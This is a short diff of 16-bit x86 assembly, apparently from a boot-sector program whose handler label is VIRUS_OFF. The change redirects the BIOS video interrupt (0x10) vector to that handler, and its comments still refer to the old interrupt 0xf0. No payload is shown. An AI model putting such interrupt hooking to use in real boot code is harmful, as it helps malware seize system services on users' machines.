@@ -1,6 +1,5 @@
 bits 16
 BIOS_VIDEO          equ 0x10
-CUSTOM_VIDEO        equ 0xf0
 DISPLAY_FUN         equ 0x13
 CLEAR_FUN           equ 0x06
 
@@ -89,7 +88,7 @@ start:
 
     call 0x:load_sector
     mov ah, CLEAR_FUN
-    int CUSTOM_VIDEO
+    int BIOS_VIDEO
 
     call MAIN_SEG:MAIN_OFF
 
@@ -111,7 +110,7 @@ start:
     pop ds
 
     mov ah, CLEAR_FUN
-    int CUSTOM_VIDEO
+    int BIOS_VIDEO
 
     mov ax, 0x0003
     int BIOS_VIDEO
@@ -213,8 +212,8 @@ set_ivt:
     xor ax, ax
     mov es, ax                                           ; es = 0x0000, IVT segment
     cli                                                  ; disable interrupts during change
-    mov word [es:CUSTOM_VIDEO * 4], VIRUS_OFF            ; IP for int 0xf0 → point to `function_group`
-    mov   word [es:CUSTOM_VIDEO * 4 + 2 ], cs            ; CS for int 0xf0 → current segment
+    mov word [es:BIOS_VIDEO * 4], VIRUS_OFF            ; IP for int 0xf0 → point to `function_group`
+    mov   word [es:BIOS_VIDEO * 4 + 2 ], cs            ; CS for int 0xf0 → current segment
     sti                                                  ; re-enable interrupts
 
     pop es
